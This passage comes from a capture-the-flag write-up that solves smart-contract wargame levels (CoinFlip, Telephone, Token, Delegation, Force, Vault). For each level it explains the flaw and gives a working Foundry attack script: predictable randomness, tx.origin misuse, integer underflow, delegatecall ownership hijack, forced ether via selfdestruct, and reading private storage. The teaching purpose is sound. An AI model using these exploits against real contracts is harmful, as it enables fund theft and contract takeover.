    <span class="nx">uint256</span> <span class="nx">blockValue</span> <span class="o">=</span> <span class="nf">uint256</span><span class="p">(</span><span class="nf">blockhash</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">number</span> <span class="o">-</span> <span class="mi">1</span><span class="p">));</span>

    <span class="nf">if </span><span class="p">(</span><span class="nx">lastHash</span> <span class="o">==</span> <span class="nx">blockValue</span><span class="p">)</span> <span class="p">{</span>
      <span class="nf">revert</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="nx">lastHash</span> <span class="o">=</span> <span class="nx">blockValue</span><span class="p">;</span>
    <span class="nx">uint256</span> <span class="nx">coinFlip</span> <span class="o">=</span> <span class="nx">blockValue</span> <span class="o">/</span> <span class="nx">FACTOR</span><span class="p">;</span>
    <span class="nx">bool</span> <span class="nx">side</span> <span class="o">=</span> <span class="nx">coinFlip</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">?</span> <span class="kc">true</span> <span class="p">:</span> <span class="kc">false</span><span class="p">;</span>

    <span class="nf">if </span><span class="p">(</span><span class="nx">side</span> <span class="o">==</span> <span class="nx">_guess</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">consecutiveWins</span><span class="o">++</span><span class="p">;</span>
      <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="nx">consecutiveWins</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Goal :</li>
</ul>

<ol>
  <li>We have to make the <code class="language-plaintext highlighter-rouge">consecutiveWins</code> to 10. We need to guess the coin flip consecutives 10 times.</li>
</ol>

<ul>
  <li>Solution :</li>
</ul>

<ol>
  <li>We can implement the same logic which is used to find the <code class="language-plaintext highlighter-rouge">side</code> of the coin in the <code class="language-plaintext highlighter-rouge">CoinFlip</code> contract.</li>
  <li>Write a new Attack contract which will perform the <code class="language-plaintext highlighter-rouge">flip()</code> calculation and sends the value to the <code class="language-plaintext highlighter-rouge">CoinFlip</code> contract.</li>
  <li>Since the entire computaion at both contracts happens in same transaction, the <code class="language-plaintext highlighter-rouge">block.hash</code> and <code class="language-plaintext highlighter-rouge">block.number</code> remains same the both contracts.</li>
  <li>But we need to run the Attack script 10 times with a small amount of time delay. Because the last blockhash should not be equal to the current blockhash. So, running script at different times will change the block of the transaction.</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">CoinFlipSolve.s.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">CoinFlip</span> <span class="p">{</span>

  <span class="nx">uint256</span> <span class="kr">public</span> <span class="nx">consecutiveWins</span><span class="p">;</span>
  <span class="nx">uint256</span> <span class="nx">lastHash</span><span class="p">;</span>
  <span class="nx">uint256</span> <span class="nx">FACTOR</span> <span class="o">=</span> <span class="mi">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="p">;</span>

  <span class="nf">constructor</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">consecutiveWins</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">flip</span><span class="p">(</span><span class="nx">bool</span> <span class="nx">_guess</span><span class="p">)</span> <span class="kr">public</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">uint256</span> <span class="nx">blockValue</span> <span class="o">=</span> <span class="nf">uint256</span><span class="p">(</span><span class="nf">blockhash</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">number</span> <span class="o">-</span> <span class="mi">1</span><span class="p">));</span>

    <span class="nf">if </span><span class="p">(</span><span class="nx">lastHash</span> <span class="o">==</span> <span class="nx">blockValue</span><span class="p">)</span> <span class="p">{</span>
      <span class="nf">revert</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="nx">lastHash</span> <span class="o">=</span> <span class="nx">blockValue</span><span class="p">;</span>
    <span class="nx">uint256</span> <span class="nx">coinFlip</span> <span class="o">=</span> <span class="nx">blockValue</span> <span class="o">/</span> <span class="nx">FACTOR</span><span class="p">;</span>
    <span class="nx">bool</span> <span class="nx">side</span> <span class="o">=</span> <span class="nx">coinFlip</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">?</span> <span class="kc">true</span> <span class="p">:</span> <span class="kc">false</span><span class="p">;</span>

    <span class="nf">if </span><span class="p">(</span><span class="nx">side</span> <span class="o">==</span> <span class="nx">_guess</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">consecutiveWins</span><span class="o">++</span><span class="p">;</span>
      <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="nx">consecutiveWins</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/CoinFlipSolve.s.sol:CoinFlipSolve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<h1 id="4-telephone">4 Telephone</h1>

<p><code class="language-plaintext highlighter-rouge">Telephone.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Telephone</span> <span class="p">{</span>

  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span>

  <span class="nf">constructor</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">changeOwner</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_owner</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nf">if </span><span class="p">(</span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span> <span class="o">!=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">owner</span> <span class="o">=</span> <span class="nx">_owner</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Goal</li>
</ul>

<ol>
  <li>Claim the ownership of the Telephone contract</li>
</ol>

<ul>
  <li>Solution</li>
</ul>

<ol>
  <li>Simply call the <code class="language-plaintext highlighter-rouge">changeOwner()</code> function from a contract.</li>
  <li>If the <code class="language-plaintext highlighter-rouge">msg.sender</code> is equals to <code class="language-plaintext highlighter-rouge">tx.origin</code> which means the call was from a EOA. If its not, then the call is from a contract.</li>
  <li>EOA is the address which originates any transation in the ethereum.</li>
  <li>So, we have to call the <code class="language-plaintext highlighter-rouge">changeOwner()</code> from an Attack contract.</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">TelephoneSolve.s.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Telephone</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Telephone.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">TelephoneSolve</span> <span class="nx">is</span> <span class="nx">Script</span><span class="p">{</span>
    <span class="nx">Telephone</span> <span class="kr">public</span> <span class="nx">telephone</span> <span class="o">=</span> <span class="nc">Telephone</span><span class="p">(</span><span class="mh">0xbB45D0C7AC29151e0309338a63a7fFEffA348585</span><span class="p">);</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="nx">external</span><span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envUint</span><span class="p">(</span><span class="dl">"</span><span class="s2">PRIVATE_KEY</span><span class="dl">"</span><span class="p">));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Original Owner : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">telephone</span><span class="p">.</span><span class="nf">owner</span><span class="p">());</span>

        <span class="nx">Attack</span> <span class="nx">attack</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Attack</span><span class="p">(</span><span class="nx">telephone</span><span class="p">);</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Attack Address : </span><span class="dl">"</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">attack</span><span class="p">));</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">New Owner : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">telephone</span><span class="p">.</span><span class="nf">owner</span><span class="p">());</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">Attack</span><span class="p">{</span>
    <span class="nx">Telephone</span> <span class="kr">public</span> <span class="nx">telephone</span><span class="p">;</span>
    <span class="nf">constructor</span><span class="p">(</span><span class="nx">Telephone</span> <span class="nx">_telephone</span><span class="p">){</span>
        <span class="nx">telephone</span> <span class="o">=</span> <span class="nx">_telephone</span><span class="p">;</span>
        <span class="nx">telephone</span><span class="p">.</span><span class="nf">changeOwner</span><span class="p">(</span><span class="mh">0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/TelephoneSolve.s.sol:TelephoneSolve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<h1 id="5-token">5 Token</h1>

<p><code class="language-plaintext highlighter-rouge">Token.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Token</span> <span class="p">{</span>

  <span class="nf">mapping</span><span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">uint</span><span class="p">)</span> <span class="nx">balances</span><span class="p">;</span>
  <span class="nx">uint</span> <span class="kr">public</span> <span class="nx">totalSupply</span><span class="p">;</span>

  <span class="nf">constructor</span><span class="p">(</span><span class="nx">uint</span> <span class="nx">_initialSupply</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">=</span> <span class="nx">totalSupply</span> <span class="o">=</span> <span class="nx">_initialSupply</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_to</span><span class="p">,</span> <span class="nx">uint</span> <span class="nx">_value</span><span class="p">)</span> <span class="kr">public</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
    <span class="nf">require</span><span class="p">(</span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">-</span> <span class="nx">_value</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">);</span>
    <span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="nx">_value</span><span class="p">;</span>
    <span class="nx">balances</span><span class="p">[</span><span class="nx">_to</span><span class="p">]</span> <span class="o">+=</span> <span class="nx">_value</span><span class="p">;</span>
    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">balanceOf</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_owner</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">uint</span> <span class="nx">balance</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">balances</span><span class="p">[</span><span class="nx">_owner</span><span class="p">];</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Goal</li>
</ul>

<ol>
  <li>We have initial token balance of 20, we need to get ourself more tokens.</li>
</ol>

<p>Solution :</p>

<ol>
  <li>This contract uses solidity pragma <code class="language-plaintext highlighter-rouge">0.6.0</code>, in which no arithmetic overflow/underflow checks are not performed by default.</li>
  <li>In <code class="language-plaintext highlighter-rouge">transfer()</code> function the require check can be bypassed when we pass value as more than 20.</li>
  <li>20 - 21 = -1 which results in <code class="language-plaintext highlighter-rouge">2**256 - 1</code>. Which is <code class="language-plaintext highlighter-rouge">&gt;= 0</code> and the same will happens in the update of balance at sender.</li>
  <li><code class="language-plaintext highlighter-rouge">balances[msg.sender] -= _value;</code> will become balance[msg.sender] = 20 - 21 = 2**256 - 1.</li>
  <li>A huge amount of tokens to our account.</li>
</ol>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/TokenSolve.s.sol:TokenSolve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<h1 id="6-delegation">6 Delegation</h1>

<p><code class="language-plaintext highlighter-rouge">Delegation.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Delegate</span> <span class="p">{</span>

  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span>

  <span class="nf">constructor</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_owner</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">_owner</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">pwn</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">Delegation</span> <span class="p">{</span>

  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span>
  <span class="nx">Delegate</span> <span class="nx">delegate</span><span class="p">;</span>

  <span class="nf">constructor</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_delegateAddress</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">delegate</span> <span class="o">=</span> <span class="nc">Delegate</span><span class="p">(</span><span class="nx">_delegateAddress</span><span class="p">);</span>
    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="nf">fallback</span><span class="p">()</span> <span class="nx">external</span> <span class="p">{</span>
    <span class="p">(</span><span class="nx">bool</span> <span class="nx">result</span><span class="p">,)</span> <span class="o">=</span> <span class="nf">address</span><span class="p">(</span><span class="nx">delegate</span><span class="p">).</span><span class="nf">delegatecall</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
    <span class="nf">if </span><span class="p">(</span><span class="nx">result</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">this</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Goal</li>
</ul>

<ol>
  <li>Claim ownership of Delegation contract</li>
</ol>

<ul>
  <li>Solution</li>
</ul>

<ol>
  <li><code class="language-plaintext highlighter-rouge">Delegation</code> contracts uses delegatecall to call the other contract <code class="language-plaintext highlighter-rouge">Delegate</code>.</li>
  <li>One thing to remember with delegatecall is that it will maintain the <code class="language-plaintext highlighter-rouge">msg.sender</code> and <code class="language-plaintext highlighter-rouge">msg.value</code> when it calls other contract.</li>
  <li>And also it updates the caller contract storage not the contract which being called.</li>
  <li>So, when we call <code class="language-plaintext highlighter-rouge">pwn()</code> on the Delegation address it will forward the call to Delegate contract and updates the owner variable in Delegation contract.</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">DelegationSolve.s.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">../src/Delegation.sol</span><span class="dl">"</span><span class="p">;</span>


<span class="nx">contract</span> <span class="nx">DelegationSolve</span> <span class="nx">is</span> <span class="nx">Script</span><span class="p">{</span>
    <span class="nx">Delegation</span> <span class="kr">public</span> <span class="nx">delegation</span> <span class="o">=</span> <span class="nc">Delegation</span><span class="p">(</span><span class="mh">0xFb9BeF4E9A8d68C2Bc2c4D2dE5688fbe0e8224F2</span><span class="p">);</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="nx">external</span><span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">();</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Initial Owner : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">delegation</span><span class="p">.</span><span class="nf">owner</span><span class="p">());</span>
        
        <span class="nf">address</span><span class="p">(</span><span class="nx">delegation</span><span class="p">).</span><span class="nf">call</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encodeWithSignature</span><span class="p">(</span><span class="dl">"</span><span class="s2">pwn()</span><span class="dl">"</span><span class="p">));</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Final Owner : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">delegation</span><span class="p">.</span><span class="nf">owner</span><span class="p">());</span>
        
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/DelegationSolve.s.sol:DelegationSolve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<h1 id="7-force">7 Force</h1>

<p><code class="language-plaintext highlighter-rouge">Force.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Force</span> <span class="p">{</span><span class="cm">/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/</span><span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Goal</li>
</ul>

<ol>
  <li>We need to make the balance of the Force contract more than 0.</li>
</ol>

<ul>
  <li>Solution</li>
</ul>

<ol>
  <li>There is no <code class="language-plaintext highlighter-rouge">receive()/fallback()</code> function and no payable functions in the Force contract.</li>
  <li>If we send any ether to this contract it will be reverted.</li>
  <li>There are more ways to receive ether not just <code class="language-plaintext highlighter-rouge">receive()/fallback()</code>.</li>
  <li>Ether can be received via coinbase transaction, i.e a mining reward.</li>
  <li>Also when someone called selfdestruct on any contract and mentioned our address in the recepient of the ether after selftdestruct.</li>
  <li>So, we can deploy a contract with some ether and implement a selfdestruct function and pass the recepient as the <code class="language-plaintext highlighter-rouge">Force</code> contract address.</li>
  <li>Upon selfdestruct of the Attack contract it Force contract will receive ether.</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">ForceSolve.s.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">Force</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Force.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">ForceSolve</span> <span class="nx">is</span> <span class="nx">Script</span> <span class="p">{</span>
    <span class="nx">Force</span> <span class="kr">public</span> <span class="nx">force</span> <span class="o">=</span> <span class="nc">Force</span><span class="p">(</span><span class="mh">0xef1ec80b578969a99B840745178d655f3594Db99</span><span class="p">);</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="nx">external</span><span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envUint</span><span class="p">(</span><span class="dl">"</span><span class="s2">PRIVATE_KEY</span><span class="dl">"</span><span class="p">));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">balance of Force : </span><span class="dl">"</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">force</span><span class="p">).</span><span class="nx">balance</span><span class="p">);</span>
        <span class="k">new</span> <span class="nx">Attack</span><span class="p">{</span><span class="nl">value</span><span class="p">:</span> <span class="mi">100</span> <span class="nx">wei</span><span class="p">}().</span><span class="nf">exploit</span><span class="p">(</span><span class="nf">payable</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">force</span><span class="p">)));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">balance of Force : </span><span class="dl">"</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">force</span><span class="p">).</span><span class="nx">balance</span><span class="p">);</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">Attack</span><span class="p">{</span>
    <span class="nx">address</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span>
    <span class="nf">constructor</span><span class="p">()</span> <span class="nx">payable</span> <span class="p">{</span>
        <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">address</span> <span class="nx">payable</span> <span class="nx">_fundReceiver</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nf">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">==</span> <span class="nx">owner</span><span class="p">);</span>
        <span class="nf">selfdestruct</span><span class="p">(</span><span class="nx">_fundReceiver</span><span class="p">);</span>
    <span class="p">}</span>

<span class="p">}</span>
</code></pre></div></div>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/ForceSolve.s.sol:ForceSolve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<h1 id="8-vault">8 Vault</h1>

<p><code class="language-plaintext highlighter-rouge">Vault.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Vault</span> <span class="p">{</span>
  <span class="nx">bool</span> <span class="kr">public</span> <span class="nx">locked</span><span class="p">;</span>
  <span class="nx">bytes32</span> <span class="kr">private</span> <span class="nx">password</span><span class="p">;</span>

  <span class="nf">constructor</span><span class="p">(</span><span class="nx">bytes32</span> <span class="nx">_password</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">locked</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
    <span class="nx">password</span> <span class="o">=</span> <span class="nx">_password</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">unlock</span><span class="p">(</span><span class="nx">bytes32</span> <span class="nx">_password</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nf">if </span><span class="p">(</span><span class="nx">password</span> <span class="o">==</span> <span class="nx">_password</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">locked</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Goal</li>
</ul>

<ol>
  <li>We need to unlock the vault.</li>
</ol>

<ul>
  <li>Solution</li>
</ul>

<ol>
  <li>We can simply call the <code class="language-plaintext highlighter-rouge">unlock()</code> function with password. But the password was not publicly accessible.</li>
  <li>Declaring a variable <code class="language-plaintext highlighter-rouge">private</code> doesn’t mean that no one can read that variable. Only the other contracts which interacts with it won’t able to view that variable.</li>
  <li>Anyone from off-chain can easily query that value. We see that password is stored in storage slot 1.</li>
  <li>We can use foundry cheatcode <code class="language-plaintext highlighter-rouge">vm.load</code> to read password and call the <code class="language-plaintext highlighter-rouge">unlock()</code> to unlock the vault.</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">VaultSolve.s.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">Vault</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Vault.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">VaultSolve</span> <span class="nx">is</span> <span class="nx">Script</span> <span class="p">{</span>
    <span class="nx">Vault</span> <span class="kr">public</span> <span class="nx">vault</span> <span class="o">=</span> <span class="nc">Vault</span><span class="p">(</span><span class="mh">0x80C30D2FE8e45F588d70bc5D530939c7f1b22f94</span><span class="p">);</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="nx">external</span><span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envUint</span><span class="p">(</span><span class="dl">"</span><span class="s2">PRIVATE_KEY</span><span class="dl">"</span><span class="p">));</span>
